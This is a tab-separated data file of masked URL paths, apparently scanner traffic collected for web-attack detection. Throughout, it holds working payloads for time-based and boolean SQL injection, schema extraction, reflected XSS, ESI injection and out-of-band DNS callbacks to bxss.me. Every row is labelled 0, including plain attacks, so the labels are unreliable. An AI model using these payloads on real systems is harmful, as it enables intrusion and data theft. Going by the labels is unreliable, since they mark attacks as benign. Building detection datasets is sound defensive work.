sentences	labels
/****/web/search?searchword=1&channelid=287219 if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&perpage=24&templet=1&token=1 \r\n\r\n 	 0
/******/1/jquery.ellipsis.js/<img src="javascript:alert(30)"> \r\n\r\n 	 0
/******/system/2019/08/05/javascript:void(0); \r\n\r\n 	 0
/****/admin/index.php?o=panel&a=receiver.edit&id=alert(777) \r\n\r\n 	 0
/******/atutor/mods/_standard/calendar/getlanguage.php?token=calendar_next<script>alert(777)</script>&pub=1 \r\n\r\n 	 0
/****/wdsjs//xfs.bxss.me/zmhdyc.html \r\n\r\n 	 0
/****/xxgkzd/list.html?new=bxss.me \r\n\r\n 	 0
/****/zfxxgk/fdzdgknr/qtfdxx<esi:include src=""http://bxss.me/rpb.png""/>/ \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl' or 5793=7259  \r\n\r\n 	 0
/****/system/2021/11/29/javascript:dozoom(14) \r\n\r\n 	 0
/******/system/2017/11/08/javascript:void(0); \r\n\r\n 	 0
/****/learn/ostickrc/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=" onmouseover="alert(777)" \r\n\r\n 	 0
/*******/h8cwpx.php \r\n\r\n 	 0
/*******/advanced-search/?term=asdf&"><script>alert(777)</script> \r\n\r\n 	 0
/****/rsxcsx/gzzexxpl/javascript:stranbody(); \r\n\r\n 	 0
/***********/jinrongqihuo/0'xor(if(now()=sysdate(),sleep(3),0))xor'z/ \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/""><script>alert(749)</script>?_=1630311587779 \r\n\r\n 	 0
/****/category/zijinqudao?page=1 and 0830=0830 \r\n\r\n 	 0
/*****/system/2021/11/20/javascript:void(); \r\n\r\n 	 0
/********/wf_work_form_save.aspx?office_missive_id=sys.fn_varbintohexstr(hashbytes('md5','kn88l')) \r\n\r\n 	 0
/*****/slidetrans.js type=text/javascript \r\n\r\n 	 0
/******/resource/js' and 2*3*8=6*8 and 'vofh'='vofh/jquery/jquery-latest.min.js \r\n\r\n 	 0
/****/gjjj/javascript:stranbody(); \r\n\r\n 	 0
/*****/slash-cms/index.php?mod=sl_pages&id=alert(777) \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(12),0)/znjs.htm \r\n\r\n 	 0
/****/admin/dash_status.php?status_data[1]=alert(777); \r\n\r\n 	 0
/**/system/2021/03/18/javascript:void(0); \r\n\r\n 	 0
/****/login.html?status='</script><script>alert(777)</script> \r\n\r\n 	 0
/****/jtdt/2021_jtyw/202109/ \r\n\r\n 	 0
/****/consultdetails/romania \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1*/-->'""></iframe></script></style></title></textarea><script >alert(33844)</script>&token=1 \r\n\r\n 	 0
/**************/worklog_template_show.aspx?id=sys.fn_varbintohexstr(hashbytes('md5','zdoy7')) \r\n\r\n 	 0
/**/index.php?title=acunetixtest3bb370&action=submit \r\n\r\n 	 0
/*****/system/2021/12/19/javascript:void(0); \r\n\r\n 	 0
/***/xxapp/xxappportalindex.z?appuser=51216 \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl%') and 9072=8675 and '%'='&owner=1707212448&wbfileid=51419 \r\n\r\n 	 0
/****/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 0
/************/template'""()&%<acx><script >s7rq(9026)</script>/jcse/110105008056111/16/images/view.js \r\n\r\n 	 0
/****/web/search?page=2&channelid=253477&searchword=1%') and 1=dbms_pipe.receive_message(chr(90)||chr(80)||chr(71)||chr(74),0)-- &keyword=1&orderby=-docreltime&perpage=15&outlinepage=10 \r\n\r\n 	 0
/****/ztbd/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/******/1/slick.min.js/<img src="javascript:alert(20)"> \r\n\r\n 	 0
/****/wp-admin/admin-ajax.php \r\n\r\n 	 0
/****/bysrd/202005/t20200511_163094.html?leader=何继先<esi:include src=""http://bxss.me/rpb.png""/> \r\n\r\n 	 0
/****/general/diary/new/submit.php \r\n\r\n 	 0
/****/rsxcsx/zyrsbd/ and 1>1 \r\n\r\n 	 0
/****/byysqgk/bxss.me/list.html \r\n\r\n 	 0
/****/user/job/lib/ap_resume_position.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1) \r\n\r\n 	 0
/******/system/2017/03/05/javascript:void(); \r\n\r\n 	 0
/****/web/search?channelid=299868&perpage=1000%') and 2750=5343  \r\n\r\n 	 0
/**/ui/widgets/hanweb/iconfont'||'/css/iconfont.css \r\n\r\n 	 0
/***/col6/index.html/""><script>alert(342)</script> \r\n\r\n 	 0
/**/index.php?do=search&search="><body onload=eval(alert(777)) ><!-- \r\n\r\n 	 0
/****/spacelist \r\n\r\n 	 0
/****/czgk/bmyjs/\"javascript:void(0)\" \r\n\r\n 	 0
/****/system/2021/09/07/013446963'"/>//</script//>//<svg/onload=alert(1549) width=100///>.shtml \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(3710)">?_=1630312015742 \r\n\r\n 	 0
/****/web/search?perpage=*/-->'""></iframe></script></style></title></textarea><script >alert(58818)</script> \r\n\r\n 	 0
/****/xxgkzn/list.html?new=bxss.me \r\n\r\n 	 0
/*****/index/lists/cate_id/166.html?page=2'and'l'='l \r\n\r\n 	 0
/****/wp-admin/post-new.php?post_type=inbound-forms&post='>alert(777) \r\n\r\n 	 0
/*******/kbzuy58.php \r\n\r\n 	 0
/******/_content/download.jsp?urltype=news.downloadattachurl%' or 4475=4475  \r\n\r\n 	 0
/****/system/2007/06/14/javascript:window.close(); \r\n\r\n 	 0
/**********/system/2020/04/24/javascript:window.print() \r\n\r\n 	 0
/******/resource/js'||'/vsb_news_search.js \r\n\r\n 	 0
/**/index%' and 2*3*8=6*8 and 'xgfh'!='xgfh%/goods.html \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/if(now()=sysdate(),sleep(12),0)/yzq/xmb_gzdxb.htm \r\n\r\n 	 0
/***/0/00/74/17/741735_259107.jpg \r\n\r\n 	 0
/****/web/search?channelid=234439&orderby=relevance&perpage=24') and 5314=3656 and ('1'='1&searchword=1 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(978)">?_=1630311679312 \r\n\r\n 	 0
/****/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 0
/****/category/silujiaoyu?*/-->'""></iframe></script></style></title></textarea><script >alert(75996)</script>=1 \r\n\r\n 	 0
/***/main/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> \r\n\r\n 	 0
/****/zcwjk' and 2*3*8=6*8 and 'vchk'='vchk/gcjsbz_sjbz/1.htm \r\n\r\n 	 0
/0""xor(if(now()=sysdate(),sleep(12),0))xor""z/******/bzxajgc/szss/plx.htm \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=5b3c34d3371f43c19b0a669176cfe2ad.doc' and 9123=9123 and 'kxyi'='kxyi \r\n\r\n 	 0
/**********/system/2017/10/18/012442898.shtml?url_type=39&object_type=webpage&pos=1 \r\n\r\n 	 0
/*****/mydevice/index.jsp?locale=""><script>alert(777)</script> \r\n\r\n 	 0
/****/bysrd/201611/t20161129_78963.html?leader=温旭东'""()&%<acx><script >room(9327)</script> \r\n\r\n 	 0
/******/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/js/base64.js \r\n\r\n 	 0
/****/admin/edit.php?menu="">pt>alert(777); script>pt> \r\n\r\n 	 0
/******/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/lmy.css \r\n\r\n 	 0
/**/ourbusiness/rdandmanufacture/201412/t20141210_22173.html' and 'x'='x \r\n\r\n 	 0
/****/system/2021/12/13/javascript:dozoom(12) \r\n\r\n 	 0
/******/system/2021/06/09/013399706'""/><img src=x onerror=alert(2324)>.shtml \r\n\r\n 	 0
/****/category/yidaiyiluwenda?page=1 and 2158=2158-- \r\n\r\n 	 0
socket.gethostbyname(""hitle"" ""kcqepxlh7dfb3.bxss.me."")[3].to_s) ""/****/7/12/art_35_234319.html \r\n\r\n 	 0
/cgi-bin/*******/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(1027)">?_=1630311706240 \r\n\r\n 	 0
/**/bxss.me.do \r\n\r\n 	 0
/*****/system/2021/11/12/javascript:void(); \r\n\r\n 	 0
/*********/plus/mytag_j.php?aid=6022 \r\n\r\n 	 0
/****/""><script>alert(71)</script> \r\n\r\n 	 0
/******/resource/storage/localupload.jsp?doaction=save and if(now()=sysdate(),sleep(6),0)/*'xor(if(now()=sysdate(),sleep(6),0))or'""xor(if(now()=sysdate(),sleep(6),0))or""*/&rid=1rnott09fg&uptoken=1ff87566684b40c688f756b86e2c3798 \r\n\r\n 	 0
/*******/main/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> \r\n\r\n 	 0
//***********/ui/lib/jquery/jquery.min.js \r\n\r\n 	 0
/**/openemr/?site="">alert(777); \r\n\r\n 	 0
/***/col209/http://bxss.me/t/fit.txt.html \r\n\r\n 	 0
/*****/system/2021/12/16/javascript:void(0); \r\n\r\n 	 0
/****/server/news/show/title/"><script>alert(777)</script>time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c \r\n\r\n 	 0
/**/ui/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/security/crypto-js.js \r\n\r\n 	 0
/****/http://bxss.me/t/fit.txt?.jpg/demo11.html \r\n\r\n 	 0
/****/system/2021/12/19/javascript:window.close(); \r\n\r\n 	 0
/vc"" and 2*3*8=6*8 and ""837p""=""837p/**/lib/easyui/themes/bootstrap/window.css \r\n\r\n 	 0
/'.gethostbyname(lc('hitum'.'nsbkdczq3dd58.bxss.me.')).'a'.chr(67).chr(hex('58')).chr(117).chr(79).chr(111).chr(90).'/****/202103/t20210303_2614145.html \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24&templet=1' or 7583=4017  \r\n\r\n 	 0
/**/mswpmm/common/newaccount.aspx?ddlculture=alert(777) \r\n\r\n 	 0
/*/http://bxss.me/t/xss.html? \r\n\r\n 	 0
/****/system/2021/11/13/javascript:window.print() \r\n\r\n 	 0
socket.gethostbyname('hitev' 'ybtblhdkd8b81.bxss.me.')[3].to_s) '/**/widgets/scrollup/js/jquery.scrollup.min.js \r\n\r\n 	 0
/****/system/2017/03/21/javascript:window.close(); \r\n\r\n 	 0
/*******/wfp.php \r\n\r\n 	 0
/******/2018index/ \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/szss/plq/xmb_gzdxb' and 2*3*8=6*8 and 'kghj'='kghj.htm \r\n\r\n 	 0
/***/wp-admin/admin-post.php?page=fancybox-for-wordpress \r\n\r\n 	 0
/****/ \r\n\r\n 	 0
/************//xfs.bxss.me/jcse/110105008056111/16/images/style.css \r\n\r\n 	 0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') or 1050=2295  \r\n\r\n 	 0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/zdlygk/ncwywfgz/zws%' and 2*3*8=6*8 and 'ikkt'!='ikkt%/yzq/xmb_gzdxb.htm \r\n\r\n 	 0
/****/20210806/javascript:void(0); \r\n\r\n 	 0
/********/files.php?folder="">alert(777) \r\n\r\n 	 0
/****/rsgzxx/rsrm' and 2*3*8=6*8 and 'je60'='je60/1.htm \r\n\r\n 	 0
/****/admin/index.php?step=admin_member_display&search_field=all&keyword=<script>alert(777)</script>&cmd_button=search user \r\n\r\n 	 0
/system%' and 2*3*8=6*8 and 'egwj'!='egwj%/********/js/newcalendar/config.js \r\n\r\n 	 0
//***********/wdsjs/hfswsj/ \r\n\r\n 	 0
/****/category/guojialingdaoren?page=1</script><script>l452(9168)</script> \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_/xfs.bxss.me/xwfbh_2065/list.html \r\n\r\n 	 0
/****/czgk/http://bxss.me/t/fit.txt/gdyx/ \r\n\r\n 	 0
/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqwsjkwyh/zzqwsjsw/\"javascript:void(0)\" \r\n\r\n 	 0
/*****/gw_admin.php?a="">alert(777);&t=settings \r\n\r\n 	 0
/******/index.php?do=search&search="><body onload=eval(alert(777)) ><!-- \r\n\r\n 	 0
/*******/taglib/channel/dage.php \r\n\r\n 	 0
/**/mavideo/gvideos.php?gid=1 and 1=1 \r\n\r\n 	 0
/**/ui/lib/easyui"" and 2*3*8=6*8 and ""ytlf""=""ytlf/plugins/jquery.panel.js \r\n\r\n 	 0
/*******/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user \r\n\r\n 	 0
/***/0/11/04/19/11041901_705855.jpg \r\n\r\n 	 0
/**********/system/2012/12/07/010972251.shtml \r\n\r\n 	 0
/**/system/2021/04/25/javascript:void(0); \r\n\r\n 	 0
/******/if(now()=sysdate(),sleep(15),0)/jpage/theme/default/css/jpage.css \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/"><script>alert(436)</script>?_=1630311406219 \r\n\r\n 	 0
/****/index.php?ac=search&at=taglist&tagkey=anony',tags) or did>1 and 101=ascii((seselectlect mid(table_name,1,1) frfromom information_schema.tables whwhereere table_schema =database() limit 1,1)) limit 1-- t t \r\n\r\n 	 0
/****/bxss.me/201610/t20161016_531.html \r\n\r\n 	 0
/******/resource/swf/flowplayer.commercial.swf \r\n\r\n 	 0
/****/zzxxgk/tjj/zfxxgkml_http://bxss.me/t/xss.html? \r\n\r\n 	 0
/******/system/javascript:alert(2698)/013399706.shtml \r\n\r\n 	 0
/******/rss/rssfeed.jsp?colid=34') and 5048=1574 and ('xrko'='xrko \r\n\r\n 	 0
/****/20210824/javascript:void(0); \r\n\r\n 	 0
/****/zfxxgk1/zfxxgkzd/0'xor(if(now()=sysdate(),sleep(12),0))xor'z.htm \r\n\r\n 	 0
/***/mobile_h5/waparticledetail.do?article_id=202006121540031139&contenttype=article \r\n\r\n 	 0
/**/main/admin/course_category.php?action=add&category=""/><script>confirm(777)</script> \r\n\r\n 	 0
/**********/system/2021/12/16/javascript:void(); \r\n\r\n 	 0
/******/download/downfile.jsp?classid=0&filename=72a64bf486d74bca8643c56c4ce11e27.doc%' and 2*3*8=6*8 and 'qab7'!='qab7% \r\n\r\n 	 0
/****/jjlzsdsscddh/xyddhlzzwn/javascript:void(0); \r\n\r\n 	 0
/************/interfaces/autocomplete.do?begin=1&end=1&eq=1&oq=1&p=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/*******/iz0aoo0.php \r\n\r\n 	 0
/************/interfaces/dimension.do?begin=20201023&end=20211023&eq=1&oq=1&p=1&pg=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pos=filenumber&pq=&q=请输入关键词&searchid=44&tpl=16&websiteid=110105008056111 \r\n\r\n 	 0
/**********/system/2021/04/04/javascript:window.print() \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/jquery.autocomplete.js/"><script>alert(2149)</script> \r\n\r\n 	 0
/**/ui/lib"" and 2*3*8=6*8 and ""yq4z""=""yq4z/security/sm2_util.js \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/plugin/waterpull/bxss.me.js \r\n\r\n 	 0
/**********/system/2011/12/10/javascript:window.close() \r\n\r\n 	 0
/*******/4og.php \r\n\r\n 	 0
/****/index.php?do=search&search="><body onload=eval(alert(777)) ><!-- \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/****/zjdt/gzdt/144.htm \r\n\r\n 	 0
/images"" and 2*3*8=6*8 and ""td8g""=""td8g/*/hanweb.min.css \r\n\r\n 	 0
/**/ui/0""xor(if(now()=sysdate(),sleep(15),0))xor""z/easyui/plugins/jquery.draggable.js \r\n\r\n 	 0
/****/system/2017/04/18/javascript:dozoom(14) \r\n\r\n 	 0
/***/app/worktable/oaurl.z?userno=51216&moduleid=1487877924 \r\n\r\n 	 0
/******/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777) \r\n\r\n 	 0
/****/石家庄?page=1'""()&%<acx><script >wkxa(9604)</script> \r\n\r\n 	 0
/*****/system/2021/11/03/javascript:window.print() \r\n\r\n 	 0
/******/window.location, \r\n\r\n 	 0
/*****/cgi-bin/ipinfo.cgi?alert(777) \r\n\r\n 	 0
/******/system/2020/11/23/javascript:window.close(); \r\n\r\n 	 0
/****/consultdetails/geogia \r\n\r\n 	 0
/*******/34qv.php \r\n\r\n 	 0
/**/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search \r\n\r\n 	 0
/****/if(now()=sysdate(),sleep(15),0)/2021_mtgz/202105/t20210505_273338.html \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(18),0))xor'z/**************/2017-02-16/221.html \r\n\r\n 	 0
/**/ui/css'||'/global.css \r\n\r\n 	 0
/**/resetpwd%' and 2*3*8=6*8 and '3hfq'!='3hfq%/show.do \r\n\r\n 	 0
/************/search.do?begin=1&end=1&eq=1&oq=1&p=1&pg=1&pos=1&pq=1&q=请输入关键词&searchid=1&tpl=16<esi:include src=""http://bxss.me/rpb.png""/>&websiteid=110105008056111 \r\n\r\n 	 0
/************/template/jcse/110105008056111/16/images/mypagination/jquery.mypagination6.0.js/<img src="javascript:alert(2165)"> \r\n\r\n 	 0
/*****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects) \r\n\r\n 	 0
/****/kjzl/ and 1=1 \r\n\r\n 	 0
/**/system/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase \r\n\r\n 	 0
/****/category/silutouzi?page='""()&%<acx><script >z9xk(9907)</script> \r\n\r\n 	 0
/******/resource%' and 2*3*8=6*8 and '2ajq'!='2ajq%/js/jquery/jquery-latest.min.js \r\n\r\n 	 0
/*********/treasury/index.aspx?nodeid=394 and 4736=4736 \r\n\r\n 	 0
/****/zfcwhy/202108/encodeuricomponent(window.location.href) \r\n\r\n 	 0
/****/zfwjn/1088/1091/list.html?new=bxss.me \r\n\r\n 	 0
/************/common-problem/jyxg/0""xor(if(now()=sysdate(),sleep(9),0))xor""z-02-15/406.html \r\n\r\n 	 0
/**/tips/tipsloginsubmit.action \r\n\r\n 	 0
/*****/zeroclipboard/zeroclipboard.swf?id="))}catch(e){}if(!self.a)self.a=!prompt(document.domain)//&width&height \r\n\r\n 	 0
/****/web/search?searchword=1&channelid=287219&perpage=24' or 5273=6063 /*&templet=1&token=1 \r\n\r\n 	 0
/******/productlistcategory.html?productcategoryid=(select char(97) char(110) char(111) char(110) char(121) char(109) char(111) char(117) char(115) char(95) char(115) char(104) char(111) char(112))&price1=3079&&price2=3319 \r\n\r\n 	 0
/******/resource/js' and 2*3*8=6*8 and 'edk5'='edk5/newcalendar/my97datepicker.htm \r\n\r\n 	 0
/******/gdhd.html \r\n\r\n 	 0
/**/system/2021/04/13/javascript:void(0); \r\n\r\n 	 0
/**/help/search.php?query=""onmouseover=""alert(1); \r\n\r\n 	 0
/0'xor(if(now()=sysdate(),sleep(15),0))xor'z/**/widgets/scrollup/css/themes/image.css \r\n\r\n 	 0
/******/formwlansetup?apmode=0&band=2&ssid=&chan=11&macaddrvalue=&wlanmacclone=0&wlanmac=&automacclone=no&repeaterssid=&wllinkmac1=&wllinkmac2=&wllinkmac3=&wllinkmac4=&wllinkmac5=&wllinkmac6=&x=54&y=12&wlan-url=test>alert(777)test \r\n\r\n 	 0
/**/actionhandler/ajax_managed_services.php \r\n\r\n 	 0
/****/system/2009/06/04/javascript:window.print() \r\n\r\n 	 0
/**/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1 \r\n\r\n 	 0
/******/jslib/ckplayer/ckplayer.js/<img src="javascript:alert(340)">?_=1630311367886 \r\n\r\n 	 0
/****/tzgg/202109/encodeuricomponent(window.location.href) \r\n\r\n 	 0
/***/sys/sys/listabd2.jsp?bd="/><script>alert(777)</script> \r\n\r\n 	 0
